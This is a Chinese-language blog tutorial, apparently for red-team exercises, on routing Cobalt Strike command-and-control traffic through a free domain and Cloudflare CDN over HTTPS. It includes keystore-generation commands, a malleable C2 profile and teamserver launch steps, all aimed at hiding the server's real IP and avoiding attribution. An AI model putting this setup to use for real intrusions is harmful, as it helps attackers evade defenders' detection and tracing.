---
title: "CobaltStrike 免费域名通过 CDN Https 上线"
slug: cobaltstrike-goes-online-via-cdn-and-https
url: /2021/cobaltstrike-goes-online-via-cdn-and-https.html
date: 2021-04-13 12:50:05
categories: ["网络安全"]
tags: ["CobaltStrike", "CDN"]
toc: true
draft: false
---

由于去年我的服务器被[微步](https://x.threatbook.cn/)标记为了远控服务器，所以一直就没有再用它了，几个月后标签才解除。所以修改 CobaltStrike 特征、隐藏真实 IP、混淆流量，防止演习中被溯源对现在的我来说显得就非常重要了。

![image-20210417225340289](https://oss.zjun.info/zjun.info/20210417225347.png)

## 0x01 Domain+CDN

需要用到一个域名，最好选择未备案域名，以防溯源。可以在[freenom](https://freenom.com/)注册免费且不用备案的的 tk 域名。

注册方法：<https://zhuanlan.zhihu.com/p/115535965>

注册完成后 DNS 改用[Cloudflare](https://dash.cloudflare.com/)，它可以提供免费 CDN 服务。添加 A 类型记录，自定义二级域名指向你的服务器真实 IP。

![image-20210413053456584](https://oss.zjun.info/zjun.info/20210413053458.png)

缓存-->配置选项中需要以下两项为开启状态

![image-20210413054007515](https://oss.zjun.info/zjun.info/20210413054008.png)

## 0x02 证书配置

首先修改 `SSL/TLS` 加密模式为 `完全` ，原服务器中创建证书

![image-20210417230959032](https://oss.zjun.info/zjun.info/20210417231002.png)

私钥类型选择 ECC，并保存保存 `.pem` 和 `.key` 文件

先删除 cobalstrike 默认的 cobalstrike.store 并使用命令重新生成

```bash
openssl pkcs12 -export -in a.pem -inkey a.key -out a.p12 -name xxx.xxxx.tk -passout pass:123456
# name 为你的域名
# pass 为自定义密码
```

使用以下命令创建证书生成全新的 cobaltstrike.store 文件

```bash
keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore cobaltstrike.store -srckeystore a.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias xxx.xxxx.tk
# 123456 为上面 pass 的自定义密码
```

## 0x03 C2.profile 配置

可使用 C2concealer 项目动态生成

```bash
git clone https://github.com/FortyNorthSecurity/C2concealer
```

或者修改下面 c2.profile 文件

```bash
https-certificate {
    set keystore "cobaltstrike.store";
    set password "123456";
}
http-stager {
    set uri_x86 "/api/1";
    set uri_x64 "/api/2";
    client {
        header "Host" "xxx.xxxx.tk";}
    server {
        output{
        print;
        }
    }
        }
http-get {
    set uri "/api/3";
    client {
        header "Host" "xxx.xxxx.tk";
        metadata {
            base64;
            header "Cookie";
        }
        }
    server {
        output{
        print;
        }
    }
        }
http-post {
    set uri "/api/4";
    client {
        header "Host" "xxx.xxxx.tk";
        id {
            uri-append;
        }
        output{
        print;
        }
    }
    server {
        output{
        print;
        }
    }
}
```

可使用命令检查 c2.profile 配置文件是否正确

```bash
./c2lint c2.profile
```

最后可利用命令启动 cobaltstrike

```bash
./teamserver ip passwd ./c2.profile
```

## 0x04 监听器

正常配置就好，只是注意 cloudflare 免费版本支持解析少量的端口，具体端口如下

```
http:
80、8080、8880、2052、2082、2086、2095
https:
443、2053、2083、2087、2096、8443
```

<img src="https://oss.zjun.info/zjun.info/20210417232750.png" alt="image-20210417232738902" style="zoom:50%; " />

## 0x05 流量检测

正常上线

![image-20210417233229911](https://oss.zjun.info/zjun.info/20210417233231.png)

通过本地测试，成功隐藏真实 IP，下面公网 IP 都是 CDN 的 IP 地址

![image-20210417233640926](https://oss.zjun.info/zjun.info/20210417233642.png)

试用了一下，缺点就是不太稳定，延迟较大。sleep 就算设为 1，心跳可能也会突破一分钟。如果是演练中我应该是不会用它，可以考虑用国内的云。

## 参考

* <https://0x20h.com/p/8dee.html>
* [https://zeo.cool/2020/10/13/CS 通过 (CDN+ 证书)powershell 上线详细版/](<https://zeo.cool/2020/10/13/CS通过(CDN+证书)powershell 上线详细版/>)
* [https://choge.top/2020/08/16/Cobaltstrike 之流量隐藏/](https://choge.top/2020/08/16/Cobaltstrike之流量隐藏/)
* [https://hosch3n.github.io/2020/12/16/检测与隐藏 Cobaltstrike 服务器/](https://hosch3n.github.io/2020/12/16/检测与隐藏Cobaltstrike服务器/)
* <https://www.cnblogs.com/Xy--1/p/14396744.html>
* <https://xz.aliyun.com/t/5728>
